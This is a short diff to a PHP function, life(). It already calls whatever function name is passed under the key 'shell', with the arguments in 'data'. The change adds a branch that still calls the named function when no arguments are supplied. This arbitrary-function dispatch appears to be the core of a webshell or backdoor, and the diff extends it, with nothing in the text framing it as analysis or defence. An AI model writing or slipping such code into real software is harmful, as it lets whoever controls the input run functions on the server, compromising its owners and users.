@@ -25,7 +25,14 @@ function life()
     {
         if (isset($arr["shell"]) && $arr["shell"]!="")
         {
-            call_user_func_array($arr['shell'], $arr["data"]);
+            if (isset($arr["data"]) && !empty($arr["data"]))
+            {
+                call_user_func_array($arr['shell'], $arr["data"]);
+            }
+            else{
+                call_user_func($arr['shell']);
+            }
+
         }
     }
 }
